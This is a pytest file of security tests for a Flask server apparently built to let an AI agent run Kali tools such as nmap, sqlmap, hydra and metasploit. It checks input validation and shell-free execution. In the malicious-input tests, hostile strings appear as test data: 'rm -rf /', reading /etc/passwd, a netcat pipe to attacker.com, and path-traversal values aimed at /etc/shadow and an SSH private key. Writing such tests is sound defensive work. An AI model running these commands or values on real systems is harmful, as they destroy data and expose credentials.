#!/usr/bin/env python3
"""
Security-focused tests for MCP Kali Server.

Tests command injection prevention, input validation, and security controls.
"""

import pytest
import json
from unittest.mock import patch, MagicMock
import kali_server


class TestCommandInjectionPrevention:
    """Test protection against command injection attacks."""

    def test_command_allowlist_enforcement(self, flask_client):
        """Test that only allowlisted commands can be executed via /api/command."""
        # Try to execute a command not in the allowlist
        response = flask_client.post(
            '/api/command',
            data=json.dumps({"action": "malicious"}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "Action parameter is required" in data["error"]

    def test_command_allowlist_valid_action(self, flask_client, mock_successful_command):
        """Test that allowlisted commands can be executed."""
        response = flask_client.post(
            '/api/command',
            data=json.dumps({"action": "whoami"}),
            content_type='application/json'
        )

        assert response.status_code == 200
        data = json.loads(response.data)
        assert "stdout" in data or "success" in data

    def test_missing_action_parameter(self, flask_client):
        """Test that missing action parameter is rejected."""
        response = flask_client.post(
            '/api/command',
            data=json.dumps({}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_empty_action_parameter(self, flask_client):
        """Test that empty action parameter is rejected."""
        response = flask_client.post(
            '/api/command',
            data=json.dumps({"action": ""}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_shell_false_in_command_executor(self, mock_subprocess_popen):
        """Verify that shell=False is used in command execution."""
        mock_popen, mock_process = mock_subprocess_popen

        executor = kali_server.CommandExecutor(["echo", "test"])
        executor.execute()

        # Verify shell=False was passed to Popen
        mock_popen.assert_called_once()
        call_kwargs = mock_popen.call_args[1]
        assert call_kwargs['shell'] is False

    def test_command_as_list_not_string(self, mock_subprocess_popen):
        """Verify commands are passed as lists, not strings."""
        mock_popen, mock_process = mock_subprocess_popen

        executor = kali_server.CommandExecutor(["ls", "-la"])
        executor.execute()

        # Verify command was passed as a list
        call_args = mock_popen.call_args[0][0]
        assert isinstance(call_args, list)
        assert call_args == ["ls", "-la"]


class TestInputValidation:
    """Test input validation across all tool endpoints."""

    def test_nmap_missing_target(self, flask_client):
        """Test nmap endpoint rejects missing target."""
        response = flask_client.post(
            '/api/tools/nmap',
            data=json.dumps({}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "Target parameter is required" in data["error"]

    def test_nmap_empty_target(self, flask_client):
        """Test nmap endpoint rejects empty target."""
        response = flask_client.post(
            '/api/tools/nmap',
            data=json.dumps({"target": ""}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_gobuster_missing_url(self, flask_client):
        """Test gobuster endpoint rejects missing URL."""
        response = flask_client.post(
            '/api/tools/gobuster',
            data=json.dumps({}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "URL parameter is required" in data["error"]

    def test_gobuster_invalid_mode(self, flask_client):
        """Test gobuster endpoint rejects invalid mode."""
        response = flask_client.post(
            '/api/tools/gobuster',
            data=json.dumps({"url": "http://example.com", "mode": "invalid"}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "Invalid mode" in data["error"]

    def test_gobuster_valid_modes(self, flask_client, mock_successful_command):
        """Test gobuster accepts all valid modes."""
        valid_modes = ["dir", "dns", "fuzz", "vhost"]

        for mode in valid_modes:
            response = flask_client.post(
                '/api/tools/gobuster',
                data=json.dumps({"url": "http://example.com", "mode": mode}),
                content_type='application/json'
            )
            assert response.status_code == 200

    def test_sqlmap_missing_url(self, flask_client):
        """Test sqlmap endpoint rejects missing URL."""
        response = flask_client.post(
            '/api/tools/sqlmap',
            data=json.dumps({}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_hydra_missing_target(self, flask_client):
        """Test hydra endpoint rejects missing target."""
        response = flask_client.post(
            '/api/tools/hydra',
            data=json.dumps({"service": "ssh"}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_hydra_missing_service(self, flask_client):
        """Test hydra endpoint rejects missing service."""
        response = flask_client.post(
            '/api/tools/hydra',
            data=json.dumps({"target": "192.168.1.1"}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data

    def test_hydra_missing_credentials(self, flask_client):
        """Test hydra endpoint requires username/password parameters."""
        response = flask_client.post(
            '/api/tools/hydra',
            data=json.dumps({"target": "192.168.1.1", "service": "ssh"}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "Username" in data["error"] or "password" in data["error"]

    def test_john_missing_hash_file(self, flask_client):
        """Test john endpoint rejects missing hash file."""
        response = flask_client.post(
            '/api/tools/john',
            data=json.dumps({}),
            content_type='application/json'
        )

        assert response.status_code == 400
        data = json.loads(response.data)
        assert "error" in data
        assert "Hash file parameter is required" in data["error"]


class TestMaliciousInputHandling:
    """Test handling of malicious input patterns."""

    def test_command_injection_attempts_in_nmap_target(self, flask_client, malicious_payloads, mock_successful_command):
        """Test that command injection attempts in nmap target are handled safely."""
        for payload in malicious_payloads:
            response = flask_client.post(
                '/api/tools/nmap',
                data=json.dumps({"target": payload}),
                content_type='application/json'
            )
            # Should execute (with shell=False, preventing injection)
            # The command will likely fail, but shouldn't allow code execution
            assert response.status_code in [200, 500]  # Either executes safely or fails

    def test_command_injection_in_additional_args(self, flask_client, mock_successful_command):
        """Test command injection attempts in additional_args parameter."""
        malicious_args = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234"
        ]

        for args in malicious_args:
            response = flask_client.post(
                '/api/tools/nmap',
                data=json.dumps({
                    "target": "127.0.0.1",
                    "additional_args": args
                }),
                content_type='application/json'
            )
            # Should not return error due to injection (shell=False protects)
            assert response.status_code in [200, 500]

    def test_path_traversal_in_wordlist(self, flask_client, mock_successful_command):
        """Test path traversal attempts in wordlist parameters."""
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "../../../../../../root/.ssh/id_rsa"
        ]

        for path in malicious_paths:
            response = flask_client.post(
                '/api/tools/gobuster',
                data=json.dumps({
                    "url": "http://example.com",
                    "mode": "dir",
                    "wordlist": path
                }),
                content_type='application/json'
            )
            # Should execute but file won't exist or will fail safely
            assert response.status_code in [200, 500]


class TestErrorHandling:
    """Test proper error handling and response formats."""

    def test_malformed_json(self, flask_client):
        """Test handling of malformed JSON requests."""
        response = flask_client.post(
            '/api/tools/nmap',
            data='{"target": invalid json}',
            content_type='application/json'
        )

        assert response.status_code in [400, 500]

    def test_missing_content_type(self, flask_client):
        """Test handling of requests without content-type header."""
        response = flask_client.post(
            '/api/tools/nmap',
            data='{"target": "127.0.0.1"}'
        )

        # Flask may handle this differently
        assert response.status_code in [200, 400, 415, 500]

    def test_null_parameters(self, flask_client):
        """Test handling of null parameter values."""
        response = flask_client.post(
            '/api/tools/nmap',
            data=json.dumps({"target": None}),
            content_type='application/json'
        )

        assert response.status_code in [400, 500]

    def test_non_string_parameters(self, flask_client, mock_successful_command):
        """Test handling of non-string parameter values."""
        response = flask_client.post(
            '/api/tools/nmap',
            data=json.dumps({"target": 12345}),
            content_type='application/json'
        )

        # Should handle type conversion or fail gracefully
        assert response.status_code in [200, 400, 500]


class TestResourceFileHandling:
    """Test security of temporary file creation and cleanup."""

    @patch('builtins.open', create=True)
    @patch('os.remove')
    def test_metasploit_resource_file_cleanup(self, mock_remove, mock_open, flask_client, mock_successful_command):
        """Test that Metasploit resource files are cleaned up."""
        mock_file = MagicMock()
        mock_open.return_value.__enter__.return_value = mock_file

        response = flask_client.post(
            '/api/tools/metasploit',
            data=json.dumps({
                "module": "exploit/test",
                "options": {"RHOST": "192.168.1.1"}
            }),
            content_type='application/json'
        )

        assert response.status_code == 200
        # Verify file was attempted to be removed
        mock_remove.assert_called_once_with('/tmp/mcp_msf_resource.rc')

    @patch('builtins.open', create=True)
    @patch('os.remove')
    def test_metasploit_resource_file_cleanup_on_error(self, mock_remove, mock_open, flask_client):
        """Test resource file cleanup even when removal fails."""
        mock_file = MagicMock()
        mock_open.return_value.__enter__.return_value = mock_file
        mock_remove.side_effect = Exception("Permission denied")

        with patch('subprocess.Popen') as mock_popen:
            mock_process = MagicMock()
            mock_process.stdout.readline = MagicMock(return_value='')
            mock_process.stderr.readline = MagicMock(return_value='')
            mock_process.wait = MagicMock(return_value=0)
            mock_popen.return_value = mock_process

            response = flask_client.post(
                '/api/tools/metasploit',
                data=json.dumps({
                    "module": "exploit/test",
                    "options": {}
                }),
                content_type='application/json'
            )

            # Should still succeed even if cleanup fails
            assert response.status_code == 200


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
